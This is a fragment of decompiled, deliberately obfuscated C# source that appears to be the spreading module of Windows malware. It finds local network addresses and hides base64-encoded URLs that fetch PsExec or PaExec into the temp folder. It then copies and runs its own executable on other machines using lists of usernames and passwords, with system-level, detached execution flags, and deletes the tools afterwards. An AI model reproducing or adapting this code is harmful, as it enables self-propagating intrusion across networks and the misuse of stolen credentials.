							if (RLgUMHIwwGSuCLo.qNaOJgFKjgde)
							{
								if (File.Exists(XUJXYfEtvoPEsg))
								{
									RLgUMHIwwGSuCLo.oapSGNsteEjKT(XUJXYfEtvoPEsg, "\\\\" + ip + " -u \"" + mETYHJKQONGdh[i] + "\" -p \"" + IDypeTdFTZ[i] + "\" -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
								}
							}
							else if (File.Exists(kvXyWBYLnIsSU))
							{
								RLgUMHIwwGSuCLo.oapSGNsteEjKT(kvXyWBYLnIsSU, "\\\\" + ip + " -u \"" + mETYHJKQONGdh[i] + "\" -p \"" + IDypeTdFTZ[i] + "\" -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
							}
						}
					}
					else if (RLgUMHIwwGSuCLo.qNaOJgFKjgde)
					{
						if (File.Exists(XUJXYfEtvoPEsg))
						{
							RLgUMHIwwGSuCLo.oapSGNsteEjKT(XUJXYfEtvoPEsg, "\\\\" + ip + " -d -f -h -s -n 5 -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
						}
					}
					else if (File.Exists(kvXyWBYLnIsSU))
					{
						RLgUMHIwwGSuCLo.oapSGNsteEjKT(kvXyWBYLnIsSU, "\\\\" + ip + " -d -h -s -f -accepteula -nobanner -c \"" + Assembly.GetEntryAssembly()!.Location + "\"");
					}
				}
			});
		}
		catch
		{
			return;
		}
		try
		{
			if (File.Exists(XUJXYfEtvoPEsg))
			{
				File.Delete(XUJXYfEtvoPEsg);
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (File.Exists(kvXyWBYLnIsSU))
			{
				File.Delete(kvXyWBYLnIsSU);
			}
		}
		catch (Exception)
		{
		}
	}

	public static List<string> uPycWbCDbJqwEIYp()
	{
		List<string> list = new List<string>();
		IPHostEntry hostEntry = Dns.GetHostEntry(Dns.GetHostName());
		IPAddress[] addressList = hostEntry.AddressList;
		foreach (IPAddress iPAddress in addressList)
		{
			if (iPAddress.AddressFamily.ToString() == "InterNetwork")
			{
				list.Add(iPAddress.ToString());
			}
		}
		return list;
	}

	public static string CvEoQOixpFrRGlG()
	{
		if (IntPtr.Size == 8)
		{
			return dKmUesTGyipVqw(new Uri(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
		}
		return dKmUesTGyipVqw(new Uri(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("aHR0cHM6Ly93d3cucG93ZXJhZG1pbi5jb20vcGFleGVjL3BhZXhlYy5leGU=")));
	}

	public static string vpOYFondAIdekb()
	{
		if (IntPtr.Size == 8)
		{
			return dKmUesTGyipVqw(new Uri(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWM2NC5leGU=")));
		}
		return dKmUesTGyipVqw(new Uri(RLgUMHIwwGSuCLo.CZuAqRlrrEeJTK("aHR0cDovL2xpdmUuc3lzaW50ZXJuYWxzLmNvbS9Qc0V4ZWMuZXhl")));
	}

	public static bool CbhArPTHtYjI(string EXIKtzvibWLc)
	{
		bool result = false;
		Ping ping = null;
		try
		{
			using (ping = new Ping())
			{
				PingReply pingReply = ping.Send(EXIKtzvibWLc);
				result = pingReply.Status == IPStatus.Success;
				return result;
			}
		}
		catch (PingException)
		{
			return result;
		}
		finally
		{
			ping?.Dispose();
		}
	}

	public static string dKmUesTGyipVqw(Uri oTvkZYccSaui)
	{
		string path = Path.GetRandomFileName().Replace(".", "").Remove(0, 3) + ".exe";
		WebClient webClient = new WebClient();
		webClient.DownloadFile(oTvkZYccSaui, Path.Combine(Path.GetTempPath(), path));
		return Path.Combine(Path.GetTempPath(), path);
	}

	public static List<string> DOTsuKoqKCIgW()
	{
		//IL_000d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0013: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0033: Expected O, but got Unknown
		string[] array = null;
		try
		{
			ArrayList arrayList = new ArrayList();
			ManagementObjectSearcher val = new ManagementObjectSearcher("SELECT * FROM Win32_NetworkAdapterConfiguration ");
			ManagementObjectCollection val2 = val.Get();
			ManagementObjectEnumerator enumerator = val2.GetEnumerator();
			try
			{
				while (enumerator.MoveNext())
				{
					ManagementObject val3 = (ManagementObject)enumerator.get_Current();
					if ((bool)((ManagementBaseObject)val3).get_Item("IpEnabled"))
					{
						string[] array2 = (string[])((ManagementBaseObject)val3).get_Item("IPAddress");
						string[] array3 = array2;
						foreach (string value in array3)
						{
							arrayList.Add(value);
						}
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			if (arrayList.Count > 0)
			{
				array = new string[arrayList.Count];
				arrayList.CopyTo(array);
			}
			else
			{
				array = new string[0];
			}
		}
		catch (Exception)
		{
		}
		try
		{
			if (array == null)
			{
				return null;
			}
			string[] array4 = array;
			foreach (string CgxjQinJwi in array4)
			{
				if (CgxjQinJwi.Contains(":"))
				{
					array = array.Where((string o) => o != CgxjQinJwi).ToArray();
				}
			}
			return array.ToList();
		}
		catch
		{
			return null;
		}
	}
}
